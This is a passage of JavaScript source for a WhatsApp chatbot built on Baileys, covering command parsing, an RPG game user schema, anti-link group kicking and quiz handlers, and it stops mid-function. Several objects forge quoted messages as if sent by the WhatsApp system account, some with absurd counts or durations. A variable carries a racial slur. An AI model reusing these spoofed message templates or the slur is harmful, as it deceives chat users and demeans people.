/**
   * Base By Dika Ardnt.
   * Recode By lui.
   * Contact Me on wa.me/6282146092695
   * Follow https://github.com/DikaArdnt
   * Folow - gh nya keban ≠_
*/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
const os = require('os')
const bochil = require("@bochilteam/scraper")
const zrapi = require("zrapi")
const hxz = require("hxz-api")
const expar = require("xfarr-api")
const caliph = require('caliph-api')
let nigga = []
const scrape = require("./lib/scrape.js")
const aliya = require("./lib/null.js")
const yuzzu = require('yuzzu-api')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const jimp_1 = require("jimp")
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')

// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = hisoka = async (hisoka, m, chatUpdate, store) => {
    try {        
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#%^&.+-,\/\\©^]/.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '#'
        const command = body.toLowerCase().split(' ')[0] || ''
        const isCmd = command.startsWith(prefix)
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await hisoka.decodeJid(hisoka.user.id)
        const from = mek.key.remoteJid
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = body.slice(command.length + 1, body.length)
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
	
        // Group
        const groupMetadata = m.isGroup ? await hisoka.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
	
	
	try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = db.data.users[m.sender]
            if (typeof user !== 'object') db.data.users[m.sender] = {}
            if (user) {
                    if (!isNumber(user.healt)) user.healt = 0
                    if (!isNumber(user.level)) user.level = 1
                    if (!isNumber(user.exp)) user.exp = 0
                    if (!isNumber(user.lastseen)) user.lastseen = 0
                    if (!isNumber(user.lastclaim)) user.lastclaim = 0
                    if (!isNumber(user.lastclaim2)) user.lastclaim2 = 0  
                    if (!isNumber(user.lastngojek)) user.lastngojek = 0
                    if (!isNumber(user.lastnebang)) user.lastnebang = 0
                    if (!isNumber(user.lastnyampah)) user.lastnyampah = 0
                    if (!isNumber(user.lastowner)) user.lastowner = 0
                    if (!isNumber(user.money)) user.money = 0
                    if (!isNumber(user.diamond)) user.diamond = 0
                    if (!isNumber(user.ramuan)) user.ramuan = 0
                    if (!isNumber(user.iron)) user.iron = 0
                    if (!isNumber(user.batu)) user.batu = 0
                    if (!isNumber(user.kayu)) user.kayu = 0
                    if (!isNumber(user.string)) user.string = 0  
                    if (!isNumber(user.common)) user.common = 0
                    if (!isNumber(user.uncommon)) user.uncommon = 0
                    if (!isNumber(user.mythic)) user.mythic = 0
                    if (!isNumber(user.legendary)) user.legendary = 0
                    if (!isNumber(user.pet)) user.pet = 0
                    if (!isNumber(user.psepick)) user.psepick = 0
                    if (!isNumber(user.psenjata)) user.psenjata = 0                    
                    if (!isNumber(user.potion)) user.potion = 0
                    if (!isNumber(user.sampah)) user.sampah = 0
                    if (!isNumber(user.armor)) user.armor = 0
                    if (!isNumber(user.kucing)) user.kucing = 0
                    if (!isNumber(user.kucinglastclaim)) user.kucinglastclaim = 0
                    if (!isNumber(user.kuda)) user.kuda = 0
                    if (!isNumber(user.kudalastclaim)) user.kudalastclaim = 0
                    if (!isNumber(user.rubah)) user.rubah = 0
                    if (!isNumber(user.rubahlastclaim)) user.rubahlastclaim = 0
                    if (!isNumber(user.anjing)) user.anjing = 0
                    if (!isNumber(user.anjinglastclaim)) user.anjinglastclaim = 0
                    if (!isNumber(user.area)) user.area = 0
                    if (!('banned' in user)) user.banned = false
                    if (!isNumber(user.warn)) user.warn = 0
                    if (!isNumber(user.warning)) user.warning = 0
                    if (!isNumber(user.lastIstigfar)) user.lastIstigfar = 0
                    if (!isNumber(user.call)) user.call = 0  
                    // RPG
                    if (!isNumber(user.healthmonster)) user.healthmonster = 0
                    if (!isNumber(user.anakkucing)) user.anakkucing = 0
                    if (!isNumber(user.anakkuda)) user.anakkuda = 0
                    if (!isNumber(user.anakrubah)) user.anakrubah = 0
                    if (!isNumber(user.anakanjing)) user.anakanjing = 0
                    if (!isNumber(user.serigala)) user.serigala = 0
                    if (!isNumber(user.anakserigala)) user.anakserigala = 0
                    if (!isNumber(user.naga)) user.naga = 0
                    if (!isNumber(user.anaknaga)) user.anaknaga = 0
                    if (!isNumber(user.phonix)) user.phonix = 0
                    if (!isNumber(user.anakphonix)) user.anakphonix = 0
                    if (!isNumber(user.griffin)) user.griffin = 0
                    if (!isNumber(user.anakgriffin)) user.anakgriffin = 0
                    if (!isNumber(user.kyubi)) user.kyubi = 0
                    if (!isNumber(user.anakkyubi)) user.anakkyubi = 0
                    if (!isNumber(user.centaur)) user.centaur = 0
                    if (!isNumber(user.anakcentaur)) user.anakcentaur = 0
                    if (!isNumber(user.makananpet)) user.makananpet = 0
                    if (!isNumber(user.antispam)) user.antispam = 0
                    if (!isNumber(user.antispamlastclaim)) user.antispamlastclaim = 0
                    if (!isNumber(user.sword)) user.sword = 0
                    if (!isNumber(user.sworddurability)) user.sworddurability = 0
                    if (!isNumber(user.pickaxe)) user.pickaxe = 0
                    if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
                    if (!isNumber(user.fishingrod)) user.fishingrod = 0
                    if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
                    if (!isNumber(user.apel)) user.apel = 0
                    if (!isNumber(user.ayamb)) user.ayamb = 0
                    if (!isNumber(user.ayamg)) user.ayamg = 0
                    if (!isNumber(user.sapir)) user.sapir = 0
                    if (!isNumber(user.ssapi)) user.ssapi = 0
                    if (!isNumber(user.esteh)) user.esteh = 0
                    if (!isNumber(user.leleg)) user.leleg = 0
                    if (!isNumber(user.leleb)) user.leleb = 0
                    if (!isNumber(user.lastadventure)) user.lastadventure = 0
                    if (!isNumber(user.lastkill)) user.lastkill = 0
                    if (!isNumber(user.lastfishing)) user.lastfishing = 0
                    if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
                    if (!isNumber(user.lastwar)) user.lastwar = 0
                    if (!isNumber(user.lastsda)) user.lastsda = 0
                    if (!isNumber(user.lastberbru)) user.lastberbru = 0
                    if (!isNumber(user.lastduel)) user.lastduel = 0
                    if (!isNumber(user.lastjb)) user.lastjb = 0
                    if (!isNumber(user.lastSetStatus)) user.lastSetStatus = 0
                    if (!isNumber(user.lastmining)) user.lastmining = 0
                    if (!isNumber(user.lasthunt)) user.lasthunt = 0
                    if (!isNumber(user.lastngocok)) user.lastngocok = 0
                    if (!isNumber(user.lastgift)) user.lastgift = 0
                    if (!isNumber(user.lastrob)) user.lastrob = 0
                    if (!isNumber(user.lastngojek)) user.lastngojek = 0
                    if (!isNumber(user.lastgrab)) user.lastgrab = 0
                    if (!isNumber(user.lastmerampok)) user.lastmerampok = 0                    
                    if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
                    if (!isNumber(user.lastcodereg)) user.lastcodereg = 0
                    if (!isNumber(user.lastdagang)) user.lastdagang = 0
                    if (!isNumber(user.lasthourly)) user.lasthourly = 0
                    if (!isNumber(user.lastweekly)) user.lastweekly = 0
                    if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
                    if (!isNumber(user.lastIstigfar)) user.lastIstigfar = 0
                    if (!isNumber(user.lastturu)) user.lastturu = 0
                    if (!isNumber(user.lastseen)) user.lastseen = 0
                    if (!isNumber(user.lastbansos)) user.lastbansos = 0
                    if (!isNumber(user.lastrampok)) user.lastrampok = 0
                    if (!('registered' in user)) user.registered = false
                    if (!user.registered) {
                    if (!('name' in user)) user.name = hisoka.getName(m.sender)
                    if (!('email' in user)) user.email = ''
                    if (!('label' in user)) user.label = ''
                    if (!isNumber(user.age)) user.age = -1
                    if (!isNumber(user.regTime)) user.regTime = -1
                    }
                    if (!isNumber(user.apel)) user.apel = 0
                    if (!isNumber(user.anggur)) user.anggur = 0
                    if (!isNumber(user.jeruk)) user.jeruk = 0
                    if (!isNumber(user.semangka)) user.semangka = 0
                    if (!isNumber(user.mangga)) user.mangga = 0
                    if (!isNumber(user.stroberi)) user.stroberi = 0
                    if (!isNumber(user.pisang)) user.pisang = 0
                    if (!isNumber(user.kayu)) user.kayu = 0
                    if (!isNumber(user.botol)) user.botol = 0
                    if (!isNumber(user.kardus)) user.kardus = 0
                    if (!isNumber(user.kaleng)) user.kaleng = 0
                    if (!isNumber(user.aqua)) user.aqua = 0
                    if (!isNumber(user.diamond)) user.diamond = 0
                    if (!isNumber(user.iron)) user.iron = 0
                    if (!isNumber(user.emas)) user.emas = 0
                    if (!isNumber(user.arlok)) user.arlok = 0
                    if (!isNumber(user.makanan)) user.makanan = 0
                    if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
                    if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
                    if (!isNumber(user.bibitapel)) user.bibitapel = 0
                    if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
                    if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
                    
                    if (!('premium' in user)) user.premium = false
                    if (!isNumber(user.premiumTime)) user.premiumTime = 0
                    if (!user.role) user.role = ''
                    if (!('autolevelup' in user)) user.autolevelup = false
                    if (!isNumber(user.pc)) user.pc = 0
                    //mancing
                    if (!isNumber(user.as)) user.as = 0
                    if (!isNumber(user.paus)) user.paus = 0
                    if (!isNumber(user.kepiting)) user.kepiting = 0
                    if (!isNumber(user.gurita)) user.gurita = 0
                    if (!isNumber(user.cumi)) user.cumi= 0
                    if (!isNumber(user.buntal)) user.buntal = 0
                    if (!isNumber(user.dory)) user.dory = 0
                    if (!isNumber(user.lumba)) user.lumba = 0
                    if (!isNumber(user.lobster)) user.lobster = 0
                    if (!isNumber(user.hiu)) user.hiu = 0
                    if (!isNumber(user.udang)) user.udang = 0
                    if (!isNumber(user.ikan)) user.ikan = 0
                    if (!isNumber(user.orca)) user.orca = 0
                    // kerja
                    if (!isNumber(user.atm)) user.atm = 0
                    if (!('job' in user)) user.job = 'Pengangguran'
                    if (!isNumber(user.lastjob)) user.lastjob = 0
                    if (!isNumber(user.lastkerja)) user.lastkerja = 0
                    if (!('ojek' in user)) user.ojek = false
                    if (!('pedagang' in user)) user.pedagang = false
                    if (!('dokter' in user)) user.dokter = false
                    if (!('petani' in user)) user.petani = false
                    if (!('montir' in user)) user.montir = false
                    if (!('kuli' in user)) user.kuli = false
                    if (!('polisi' in user)) user.polisi = false
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                                healt: 100,
                    level: 1,
                    exp: 0,
                    lastclaim: 0,
                    lastclaim2: 0,
                    lastngojek: 0,
                    lastnebang: 0,
                    lastnyampah: 0,
                    lastowner: 0,
                    money: 0,
                    diamond: 0,
                    iron: 0,
                    common: 0,
                    uncommon: 0,
                    mythic: 0,
                    legendary: 0,
                    pet: 0,
                    potion: 0,
                    sampah: 0,
                    armor: 0,
                    kucing: 0,
                    kucinglastclaim: 0,
                    kuda: 0,
                    kudalastclaim: 0,
                    rubah: 0,
                    rubahlastclaim: 0,
                    anjing: 0,
                    anjinglastclaim: 0,
                    naga: 0,
                    nagalastclaim: 0,
                    griffin: 0,
                    griffinlastclaim: 0,
                    centaur: 0,
                    centaurlastclaim: 0,
                    serigala: 0,
                    serigalalastclaim: 0,
                    phonix: 0,
                    phonixlastclaim: 0,
                    makanannaga: 0,
                    makananphonix: 0,
                    makanancentaur: 0,
                    makananserigala: 0,
                    area: 0,
                    banned: false,
                    warn: 0,
                    warning: 0,
                    lastIstigfar: 0,
                    call: 0,
                    afk: -1,
                    afkReason: '',
                    pasangan: '',
                    anakkucing: 0,
                    anakkuda: 0,
                    anakrubah: 0,
                    anakanjing: 0,
                    makananpet: 0,
                    antispam: 0,
                    antispamlastclaim: 0,
                    kayu: 0,
                    batu: 0,
                    string: 0,
                    sword: 0,
                    sworddurability: 0,
                    pickaxe: 0,
                    pickaxedurability: 0,
                    fishingrod: 0,
                    fishingroddurability: 0,
                    lastadventure: 0,
                    lastdungeon: 0,
                    lastduel: 0,
                    lastmining: 0,
                    lasthourly: 0,
                    lasthunt: 0,
                    lastweekly: 0,
                    lastmonthly: 0,
                    lastjb: 0,
                    lastrob: 0,
                    lastdaang: 0,
                    lastngojek: 0,
                    lastgrab: 0,
                    lastmerampok: 0,                    
                    lastngocok: 0,
                    lastturu: 0,
                    lastseen: 0,
                    lastSetStatus: 0,
                    registered: false,
                    apel: 20,
                    mangga: 20,
                    stroberi: 20,
                    semangka: 20,
                    jeruk: 20,
                    semangka: 20,                    
                    name: hisoka.getName(m.sender),
                    email: '',
                    label: '',
                    age: -1,
                    regTime: -1,
                    regTime: -1,
                    premium: false,
                    premiumTime: 0,
                    role: '',
                    autolevelup: false,
                    pc: 0,
                    // Mancing cuk
             as: 0,
            paus: 0,
            kepiting: 0,
            gurita: 0,
            cumi: 0,
            buntal: 0,
            dory: 0,
            lumba: 0,
            lobster: 0,
            hiu: 0,
            lele: 0,
            nila: 0,
            bawal: 0,
            udang: 0,
            ikan: 0,
            orca: 0,
            banteng: 0,
            harimau: 0,
            gajah: 0,
            kambing: 0,
            panda: 0,
            buaya: 0,
            kerbau : 0,
            sapi: 0,
            monyet : 0,
            babihutan: 0,
            babi: 0,
            ayam: 0,
            apel: 20,
            ayamb: 0,
            ayamg: 0,
            ssapi: 0,
            sapir: 0,
            leleb: 0,
            leleg: 0,
            esteh: 0,
                    // Kerja Woy
                    atm: 0,
                    job: 'Pengangguran',
                    lastjob: 0,
                    lastkerja: 0,
                    ojek: false,
                    pedagang: false,
                    dokter: false,
                    petani: false,
                    montir: false,
                    kuli: false,
                    polisi: false,
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
    
            let chats = db.data.chats[m.chat]
            if (typeof chats !== 'object') db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = db.data.settings[botNumber]
        if (typeof setting !== 'object') db.data.settings[botNumber] = {}
	    if (setting) {
	    if (!('anticall' in setting)) setting.anticall = true
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = true
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false
		if (!('templateLocation' in setting)) setting.templateLocation = false
	    } else global.db.data.settings[botNumber] = {
	    anticall: true,
		status: 0,
		autobio: true,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
		templateLocation: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
            let flamingo = pickRandom([
 'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=',
 'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=crafts-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&text=',
 'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=amped-logo&doScale=true&scaleWidth=800&scaleHeight=500&text=',
 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=',
 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text='
]) 
        // Push Message To Console && Auto Read
        if (m.message) {   
	        hisoka.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	   if (mek.key.remoteJid === 'status@broadcast') {
	   					hisoka.readMessages([mek.key])
              }
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    if (new Date() * 1 - setting.status > 1000) {
		await hisoka.updateProfileStatus(`Up in ${runtime(process.uptime())}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await hisoka.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        let key = {}                 
 	    key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	    key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	    key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	    key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
        hisoka.sendMessage(m.chat, { delete: key })        
        hisoka.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: hisoka.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, hisoka.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        hisoka.ev.emit('messages.upsert', msg)
        }
        //GLOBAL
       flaminge = pickRandom([
 'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=',
 'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=crafts-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&text=',
 'https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=amped-logo&doScale=true&scaleWidth=800&scaleHeight=500&text=',
 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=',
 'https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text='
])
        doc = pickRandom(['application/vnd.ms-excel', 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/msword', 'application/pdf'])                 
const thumb2 = await getBuffer('https://telegra.ph/file/ec4389c5f2bca0748cbc8.jpg')
const luithumb = await getBuffer('https://telegra.ph/file/019110c7ecbc463a32756.jpg')
wm = 'Hisoka - Morou Recode By Lui'
const fpayment = {
  key: {
    remoteJid: '0@s.whatsapp.net',
    fromMe: false,
    id: 'BAE595C600522C9C',
    participant: '0@s.whatsapp.net'
  },
  message: {
    "requestPaymentMessage": {
  "noteMessage": { extendedTextMessage: { text: `Lmao Banget Ngab` }},
  "currencyCodeIso4217": 'IDR',
  "currencyCode": 'Mau Apa Bang Di Eval? Cie Anda Kang Copas Yahh Awokawok Tolol Luhh :v',
  "requestFrom": '0@s.whatsapp.net',
  "expiryTimestamp": "300000",
    "amount1000": "1000000",
    "amount": "1000000",

    }
  }
}

const waitv2 = {
react: { text: `⏳`,
        key: { remoteJid: m.chat, fromMe: false, id: m.key.id },
      }                  
      }
const ftroli = { key: { remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message: { orderMessage: { itemCount: 9999999999999999999999999999999999999999999999999999999, status: 1, surface: 1, message: wm, orderTitle: wm, sellerJid: '0@s.whatsapp.net' } } }
const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': wm, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${wm},;;;\nFN:${wm},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabell:Ponsel\nEND:VCARD`, 'jpegThumbnail': require('fs').readFileSync('./lib/hisoka.jpg'), thumbnail: require('fs').readFileSync('./lib/hisoka.jpg'),sendEphemeral: true}}}
const fvn = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(m.chat ? 
	 { remoteJid: "6282331033919-1625305606@g.us" } : {}) 
                },
	 message: { 
		"audioMessage": {
                 "mimetype":"audio/ogg; codecs=opus",
                 "seconds": "999999999999",
                 "ptt": "true"
                        }
	                  } 
                     }
        
         const ftextt = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(m.chat ? 
	 { remoteJid: "6282331033919-1625305606@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text":wm,
                 "title": wm,
                 'jpegThumbnail': fs.readFileSync('./lib/hisoka.jpg')
                        }
	                  } 
                     }        
const fliveLoc = {
	 key:
	 { fromMe: false,
	 participant: `0@s.whatsapp.net`, ...(m.chat  ? 
	 { remoteJid: "status@broadcast" } : {}) },
	 message: { "liveLocationMessage": { "caption":"©2022 Lui","h": `${wm}`, 'jpegThumbnail': await hisoka.reSize(thumb2, 300, 300)}}
	}
const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "6282331033919@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": await hisoka.reSize(thumb2, 300, 300)//Gambarnye
					},
					"title": wm, //Kasih namalu 
					"description": `Hisoka - Morou`,
					"currencyCode": "USD",
					"priceAmount1000": "20000000",
					"retailerId": "Ghost",
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
        
const fdocs = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: wm, 
                    jpegThumbnail: await hisoka.reSize(thumb2, 300, 300)
                          }
                        }
                      }
        
const fgclink = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6282331033919-1625305606@g.us",
			"inviteCode": "null",
			"groupName": "Hisoka - Morou", 
            "caption": `Recode By Lui`,
            'jpegThumbnail': await hisoka.reSize(thumb2, 300, 300)
		}
	}
}

const fgif = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(m.chat ? 
	 { remoteJid: "6282331033919-1625305606@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": wm,
                 "h": ``,
                 'seconds': '999999999', 
                 'gifPlayback': 'true', 
                 'caption': wm,
                 'jpegThumbnail': await hisoka.reSize(thumb2, 300, 300)
                        }
                       }
	                  }
       
	    	    	    	    	    	    	    	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            hisoka.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
